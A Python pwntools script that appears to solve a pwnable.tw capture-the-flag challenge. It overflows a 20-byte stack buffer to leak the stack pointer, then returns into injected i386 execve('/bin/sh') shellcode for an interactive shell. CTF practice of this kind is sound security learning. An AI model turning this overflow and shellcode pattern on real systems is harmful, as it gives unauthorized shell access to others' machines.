from pwn import *


def exploit():
    context.arch = 'i386'
    r = remote('chall.pwnable.tw', port=10000)
    # Stack overflow
    payload = b'A' * 20
    # In the end, program will do add esp, 0x14, which will move up esp on 20 bytes
    # So, now instruction mov ecx, esp will just leak esp address
    ret_addr = p32(0x08048087)
    payload += ret_addr
    print(r.recvuntil('CTF:'))
    r.send(payload)
    esp = u32(r.recv()[:4])
    print(hex(esp))
    payload = b'A' * 20
    # +20 cause leaked esp is on the beginning of a "A" * 20 string.
    payload += p32(esp + 20)
    # shellcode to execute execve 
    shellcode = asm('\n'.join([
        'push %d' % u32('/sh\0'),
        'push %d' % u32('/bin'),
        'xor edx, edx',
        'xor ecx, ecx',
        'mov ebx, esp',
        'mov eax, 0xb',
        'int 0x80',
    ]))
    payload += shellcode
    r.send(payload)
    r.interactive()
    r.close()


if __name__=='__main__':
    exploit()
